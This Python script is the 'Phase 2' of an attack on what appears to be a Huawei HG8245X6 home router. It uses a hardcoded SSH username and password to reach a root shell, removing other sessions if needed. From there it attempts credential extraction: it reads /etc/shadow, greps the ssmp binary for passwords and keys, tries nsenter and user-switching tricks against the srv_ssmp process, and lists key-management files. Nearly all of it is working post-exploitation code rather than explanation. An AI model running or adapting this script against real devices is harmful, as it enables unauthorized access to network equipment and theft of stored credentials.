#!/usr/bin/env python3
"""
Phase 2: Access srv_ssmp process namespace and extract credentials.
ssmp PID=1650, UID=3008
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"
SSMP_PID = "1650"  # confirmed from previous run

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=15, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ "], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - srv_ssmp Namespace Access (PID=1650)")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── 1. Inspect ssmp process ────────────────────────────────
    print(f"[*] ssmp process status (PID={SSMP_PID}):")
    send_cmd(chan, f"cat /proc/{SSMP_PID}/status 2>&1 | head -20")

    # ── 2. Check /proc/ssmp cmdline & exe ─────────────────────
    print(f"\n[*] ssmp cmdline / exe:")
    send_cmd(chan, f"cat /proc/{SSMP_PID}/cmdline | tr '\\0' ' '; echo")
    send_cmd(chan, f"ls -la /proc/{SSMP_PID}/exe 2>&1")

    # ── 3. Try nsenter into ssmp namespace ────────────────────
    print(f"\n[*] Attempting nsenter into PID {SSMP_PID} namespace:")
    send_cmd(chan, f"nsenter -t {SSMP_PID} -m -u -i -n -p /bin/sh 2>&1", timeout=10)

    # ── 4. Try to read ssmp process maps ──────────────────────
    print(f"\n[*] ssmp memory maps:")
    send_cmd(chan, f"cat /proc/{SSMP_PID}/maps 2>&1 | head -20")

    # ── 5. Look for /etc/shadow hash for srv_ssmp ─────────────
    print("\n[*] /etc/shadow entries:")
    send_cmd(chan, "cat /etc/shadow 2>&1")

    # ── 6. Check ssmp binary for hardcoded strings ────────────
    print("\n[*] Strings from /bin/ssmp (passwords/keys):")
    send_cmd(chan, "cat /bin/ssmp | tr -cd '[:print:]\\n' | grep -E '.{8,}' | grep -iE 'pass|key|secret|token|auth|admin|user|login' 2>&1 | head -20", timeout=15)

    # ── 7. Check collect_ssmp.sh for clues ────────────────────
    print("\n[*] /bin/collect_ssmp.sh contents:")
    send_cmd(chan, "cat /bin/collect_ssmp.sh 2>&1")

    # ── 8. Look at ssmp open file descriptors ─────────────────
    print(f"\n[*] ssmp open files (if accessible):")
    send_cmd(chan, f"ls -la /proc/{SSMP_PID}/fd/ 2>&1 | head -20")

    # ── 9. Check IPC / shared memory for ssmp ─────────────────
    print("\n[*] IPC / shared memory segments:")
    send_cmd(chan, "ipcs -a 2>&1")

    # ── 10. Try running ssmp binary directly as srv_ssmp uid ──
    print("\n[*] su numeric UID approach:")
    # BusyBox su can take -u flag on some builds
    send_cmd(chan, "su -l srv_ssmp -s /bin/sh 2>&1", timeout=5)
    send_cmd(chan, "busybox su srv_ssmp 2>&1", timeout=5)

    # ── 11. Runuser / newgrp tricks ───────────────────────────
    print("\n[*] Trying runuser / setuidgid:")
    send_cmd(chan, "setuidgid srv_ssmp /bin/sh 2>&1", timeout=5)
    send_cmd(chan, "runuser -l srv_ssmp -s /bin/sh 2>&1", timeout=5)

    # ── 12. Check if we can ptrace ssmp process ───────────────
    print(f"\n[*] Ptrace capability check on PID {SSMP_PID}:")
    send_cmd(chan, f"cat /proc/{SSMP_PID}/wchan 2>&1")
    send_cmd(chan, f"cat /proc/sys/kernel/yama/ptrace_scope 2>&1")

    # ── 13. Look for ssmp-related config/key files ───────────
    print("\n[*] ssmp-related config/cert files:")
    send_cmd(chan, "find /var /etc /mnt -name '*ssmp*' -o -name '*kmc*' 2>/dev/null | head -20", timeout=10)

    # ── 14. Check srv_kmc (key management) ───────────────────
    print("\n[*] Key Management (srv_kmc) info:")
    send_cmd(chan, "ps | grep kmc", timeout=5)
    send_cmd(chan, "ls -la /var/srv_kmc/ 2>/dev/null | head -20")
    send_cmd(chan, "ls -la /etc/kmc/ /etc/ssmp/ 2>/dev/null")

    # ── 15. Look for ssmp socket / comm channel ───────────────
    print("\n[*] ssmp sockets and IPC:")
    send_cmd(chan, "ls /var/run/ | grep -i ssmp", timeout=5)
    send_cmd(chan, "ls /var/srv_ssmp/ 2>/dev/null | head -10")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
